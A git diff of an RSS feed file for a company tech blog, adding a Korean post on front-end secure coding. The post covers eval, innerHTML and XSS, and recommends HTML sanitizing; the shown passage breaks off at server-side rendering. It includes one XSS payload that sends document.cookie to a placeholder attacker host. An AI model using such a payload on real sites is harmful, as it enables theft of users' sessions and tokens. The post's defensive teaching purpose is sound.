@@ -1,22 +1,151 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[모인 기술 블로그]]></title><description><![CDATA[모인의 기술 블로그]]></description><link>https://themoin.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Fri, 30 Oct 2020 01:22:14 GMT</lastBuildDate><item><title><![CDATA[GraphQL과리액트로블로그만들기]]></title><link>https://themoin.github.io/2020-10-30-graphql/</link><guid isPermaLink="false">https://themoin.github.io/2020-10-30-graphql/</guid><pubDate>Fri, 30 Oct 2020 00:00:00 GMT</pubDate><content:encoded></content:encoded></item><item><title><![CDATA[testtest]]></title><description><![CDATA[하이하이하이]]></description><link>https://themoin.github.io/2020-10-21-testtest/</link><guid isPermaLink="false">https://themoin.github.io/2020-10-21-testtest/</guid><pubDate>Wed, 21 Oct 2020 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;하이하이하이&lt;/p&gt;</content:encoded></item><item><title><![CDATA[포스트맨 테스트]]></title><description><![CDATA[테스트 1. 포스트맨 사용법 포스트맨 을 잘 사용하자. 많이 사용하자 숫자를 매기면 이렇게 표시된다]]></description><link>https://themoin.github.io/testpost/</link><guid isPermaLink="false">https://themoin.github.io/testpost/</guid><pubDate>Tue, 20 Oct 2020 16:40:32 GMT</pubDate><content:encoded>&lt;h3&gt;테스트 1. 포스트맨 사용법&lt;/h3&gt;
-&lt;h3&gt;포스트맨&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;을 잘 사용하자.&lt;/li&gt;
-&lt;li&gt;많이 사용하자&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;visit &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;
-&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;dfs&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
-  w &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;false&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; visit&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;length
-  w&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;append&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; w &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; d&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;not&lt;/span&gt; visit&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;w&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
-      visit&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;w&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
-      dfs&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;w&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
-      
-dfs&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;visit&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[모인 기술 블로그]]></title><description><![CDATA[모인의 기술 블로그]]></description><link>https://themoin.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Sat, 07 Nov 2020 08:55:41 GMT</lastBuildDate><item><title><![CDATA[프론트엔드에서의 시큐어 코딩]]></title><description><![CDATA[…]]></description><link>https://themoin.github.io/2020-11-02-SecureFrontend/</link><guid isPermaLink="false">https://themoin.github.io/2020-11-02-SecureFrontend/</guid><pubDate>Mon, 02 Nov 2020 00:00:00 GMT</pubDate><content:encoded>  &lt;br /&gt;
+&lt;p&gt;안녕하세요. 모인 개발팀 이 경호입니다.&lt;/p&gt;
+&lt;p&gt;저희는 언제나 보안에 민감한 송금업을 하다 보니, 시큐어 코딩에 관해 고민하거나 이야기 나누는 시간이 많은데요.&lt;/p&gt;
+&lt;p&gt;오늘은 그 중에서도 프론트엔드에서의 보안에 관해 공유해 보려고 합니다.&lt;/p&gt;
+&lt;p&gt;프론트엔드에서 신경써야 할 보안의 영역은 광대하지만, 그 중 일부를 소개해 보려고 합니다.&lt;/p&gt;
+&lt;h2&gt;1. eval()&lt;/h2&gt;
+&lt;p&gt;eval() 함수는 매개 변수로 받은 문자열, 객체를 파싱해서 실행합니다. &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval&quot;&gt;MDN eval() 문서&lt;/a&gt; 말미에 &lt;code class=&quot;language-text&quot;&gt;Never use eval()!&lt;/code&gt; 이라는 챕터가 있으니 한 번 읽어보시는 게 좋습니다.&lt;/p&gt;
+&lt;p&gt;eval() 함수는 다음과 같은 형태로 사용할 수 있습니다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token function&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;console.log(`hi`)&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; hi&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;실제로는 주로 JSON 객체를 편하게 파싱하기 위해 사용하게 됩니다. 하지만 eval함수를 그냥 사용하는 경우는 드물겠죠.&lt;/p&gt;
+&lt;p&gt;우리가 더 주의해야 하는 경우는 내부적으로 eval을 실행하는 &lt;em&gt;다른 메서드&lt;/em&gt;를 사용할 때 입니다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token function&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;alert(&apos;에이 설마 이게 되겠어..?&apos;)&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;만약 해당 코드의 실행부를 변수로 할당했다고 가정해봅시다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; foo&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+foo &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; someHackerInputText&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;token function&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;foo&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;이제 foo 부분에 들어가는 함수, 문자열, 객체 어떤것이든 eval()을 트리거하고, 원하는대로 브라우저를 조작할 수 있게 되었습니다. 이걸 예방하는 방법은 사실 간단합니다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; foo&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token function&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;성공&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;익명 함수로 감싸주면 더 이상 내부의 문자열을 평가하려는 시도가 일어나지 않습니다. &lt;code class=&quot;language-text&quot;&gt;eval()&lt;/code&gt;은 매개 변수가 없는 익명 함수 &lt;code class=&quot;language-text&quot;&gt;()&lt;/code&gt;를 호출하고 반환값으로 받은 &lt;code class=&quot;language-text&quot;&gt;alert(&amp;#39;성공&amp;#39;)&lt;/code&gt; 이 실행됩니다.&lt;/p&gt;
+&lt;p&gt;같은 예로 &lt;code class=&quot;language-text&quot;&gt;setAttribute(&amp;quot;someHTMLEvent&amp;quot;, &amp;quot;...&amp;quot;)&lt;/code&gt; 가 있습니다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;jsx&quot;&gt;&lt;pre class=&quot;language-jsx&quot;&gt;&lt;code class=&quot;language-jsx&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;func1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;짜잔&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+someButton&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;onclick&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;func1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// BAD&lt;/span&gt;
+someButton&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;addEventListner&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;click&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;func1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// NOT BAD&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;setAttribute&lt;/code&gt; 의 두 번째 인자는 평가됩니다.&lt;/p&gt;
+&lt;p&gt;하지만 진정한 위협은 자바스크립트의 일급 함수 특성을 이용해 간단히 회피할 수 있는 위의 메소드들이 아닙니다.&lt;/p&gt;
+&lt;h2&gt;1 - 1. InnerHtml&lt;/h2&gt;
+&lt;p&gt;  &lt;code class=&quot;language-text&quot;&gt;innerHTML&lt;/code&gt;이나 리액트의 &lt;code class=&quot;language-text&quot;&gt;dangerouslySetInnerHTML&lt;/code&gt;은 퍼포먼스 차이가 존재하지만, 본질적으로 위험하다는 사실은 같습니다. 하지만 편안한 구현을 위해 필요한 친구들이기도 하지요.&lt;/p&gt;
+&lt;p&gt;  이들은 프론트엔드에서 일어날 수 있는 가장 큰 보안 허점인 XSS를 유발할 수 있습니다.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;XSS(Cross-Site-Scripting) 공격자가 프로덕트에 원치 않는 코드를 삽입하여 실행하는 취약점입니다.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;  리액트로 예를 들어보겠습니다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;jsx&quot;&gt;&lt;pre class=&quot;language-jsx&quot;&gt;&lt;code class=&quot;language-jsx&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; React &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;react&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; VeryDangereousInput &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;@src/components/&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; fetchComments &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;@api&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;Compo&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;comments&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; setComments&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; React&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;useState&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; setValue&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; React&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;useState&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+
+  React&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;useEffect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token function&quot;&gt;fetchComments&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;_init&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; _comments &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fetchComments&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token function&quot;&gt;setComments&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;_comments&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;VeryDangereousInput&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;token script language-javascript&quot;&gt;&lt;span class=&quot;token script-punctuation punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;onChange&lt;/span&gt;&lt;span class=&quot;token script language-javascript&quot;&gt;&lt;span class=&quot;token script-punctuation punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;inputText&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;setValue&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;inputText&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;
+    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;ul&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token plain-text&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;comments&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;li&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;token script language-javascript&quot;&gt;&lt;span class=&quot;token script-punctuation punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;c&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;id&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;dangerouslySetInnerHTML&lt;/span&gt;&lt;span class=&quot;token script language-javascript&quot;&gt;&lt;span class=&quot;token script-punctuation punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; __html&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; c&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token plain-text&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;ul&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;  위의 컴포넌트는 코멘트를 받는 그대로 저장하고, 그걸 그대로 출력하게 됩니다.&lt;/p&gt;
+&lt;p&gt;  이 상황에서 악의적인 공격자가 다음과 같은 문자열을 입력한다면 어떻게 될까요?&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot;&gt;&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;img&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;보안이 엉망이군요&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;onerror&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;{fetch(http://HACKERS-RULES-URL,&lt;/span&gt;
+&lt;span class=&quot;token attr-name&quot;&gt;{document.cookie})}&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;  네. 해당 페이지에 들어간 고객들의 쿠키 정보가 해커들에게 자동으로 수집되게 되었습니다. &lt;/p&gt;
+&lt;p&gt;  쿠키에 세션 아이디나 각종 토큰을 보관하는 경우라면 엄청나게 큰 보안사고로 이어질 수 있습니다.&lt;/p&gt;
+&lt;p&gt;  하지만 WYSIWIG 에디터, 마크다운 파서, 텍스트 소스에서의 마크업은 필요한 일이 상당히 있고, &lt;/p&gt;
+&lt;p&gt;  이때마다 별도의 인터페이스를 작성하는 것은 몹시 힘들고 지치는 일입니다.&lt;/p&gt;
+&lt;p&gt;  가장 간단한 해법은 &lt;code class=&quot;language-text&quot;&gt;HTML sanitizing&lt;/code&gt;을 적용하는 것입니다.&lt;/p&gt;
+&lt;p&gt; &lt;a href=&quot;https://www.npmjs.com/package/sanitize-html&quot;&gt;sanitize-html @npm&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;  위의 라이브러리를 사용하면 삽입되었을 때 위험한 문자열을 제거해줍니다.&lt;/p&gt;
+&lt;p&gt;  각종 태그에 onerror등 네이티브 이벤트 핸들러 등이 부착되는 상황을 예방할 수 있습니다.&lt;/p&gt;
+&lt;p&gt;  아니면 스스로 Validator를 만들어 해당 위험요소를 제거할 수도 있습니다. 정규식을 이용해 위험한 문자열을 추출해내는 방식을 적용해도 좋고, Flux 아키텍처를 사용한다면 스토어에 dispatch 하기 전에, 혹은 db에 해당 문자열을 보내기전에 사전 검열하는 방식으로 사용할 수도 있습니다.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2&gt;2. 서버사이드 렌더링&lt;/h2&gt;
+&lt;br /&gt;
+&lt;p&gt;  SSR을 실행할 때 한가지 더 체크해야 할 문제가 있습니다.&lt;/p&gt;
+&lt;p&gt;  Redux등 상태관리 라이브러리를 사용한다면, 초기 변수에 의존하는 렌더링을 구성하기 쉬운데 이 때 &lt;code class=&quot;language-text&quot;&gt;preloaded state&lt;/code&gt;를 사용하게 됩니다.&lt;/p&gt;
